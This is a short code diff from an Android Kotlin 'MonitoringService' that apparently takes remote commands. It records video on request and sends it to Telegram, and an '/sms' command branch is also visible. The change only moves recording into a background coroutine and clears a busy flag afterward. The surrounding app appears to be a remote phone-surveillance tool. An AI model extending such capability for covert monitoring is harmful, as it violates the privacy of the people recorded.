@@ -1772,7 +1772,13 @@ class MonitoringService : Service() {
                     sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
                 } else {
                     sendToTelegram("\uD83C\uDFA5 Recording video $seconds s\u2026")
-                    recordAndSendVideo(seconds)
+                    recordJob = serviceScope.launch {
+                        try {
+                            recordAndSendVideo(seconds)
+                        } finally {
+                            recordBusy.set(false)
+                        }
+                    }
                 }
             }
             "/sms" -> {
